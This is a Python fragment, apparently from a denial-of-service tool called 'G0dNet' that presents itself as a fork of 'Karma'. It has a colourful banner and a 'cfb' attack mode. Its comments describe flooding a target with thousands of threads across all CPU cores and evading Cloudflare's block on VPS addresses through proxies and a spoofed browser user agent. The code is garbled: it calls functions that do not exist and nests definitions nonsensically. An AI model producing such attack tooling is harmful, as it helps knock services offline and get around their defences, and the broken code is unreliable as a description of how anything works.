...
def title():
    ...
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"        Welcome To The Main Screen Of G0dNet  "+Fore.LIGHTCYAN_EX  +"       ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"          Type [help] to see the Commands    "+Fore.LIGHTCYAN_EX +"       ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"         This is a fork of the original Karma. - by g0d  "+Fore.LIGHTCYAN_EX +"        ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def command():
...
if __name__ == '__main__':
    ...
    if method == "cfb":
        ...
        ## This Function will encrypt the request's with base64
        def encode_base64():
            encode_base64 =  requests.encode_base64(url)
            encode_base64 = encode_base64.decode('utf-8')
            encode_base64 = url.request.url + encode_base64
            r = base64.urlsafe_b64encode('GET', + base64)
            requests.request('GET', encode_base64)
            while requests.status_code == 200:
                print('Encoded with base64')
                break
            
            
            ##  Function to use all the CPU cores to attack the target.
            def cpu_fnc():
                cpu_fnc = multiprocessing.cpu_count()
                cpu_fnc = cpu_fnc * 2
                cpu_fnc = cpu_fnc * 2
                cpu_fnc.start(threading)
                cpu_fnc.threading = threading.Thread(target=cpu_fnc, args=(threading,))
                cpu_fnc = threading.num_threads(2500)
                cpu_fnc = threading.main_thread(5500)
                
                
                ## Create a Function to Bypass Cloudflare WAF of blocking VPS IP's
                def block_vps():
                    block_vps = requests.get(url)
                    block_vps = requests.get(url, headers=headers)
                    block_vps = requests.get(url, headers=headers, proxies=proxies)
                    block_vps = request.waf_bypass(url, '127.0.0.1')
                    block_vps = request.waf_bypass_proxies(url, '190.176.202.80:22')
                    block_vps = address.user_agent(url, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36')
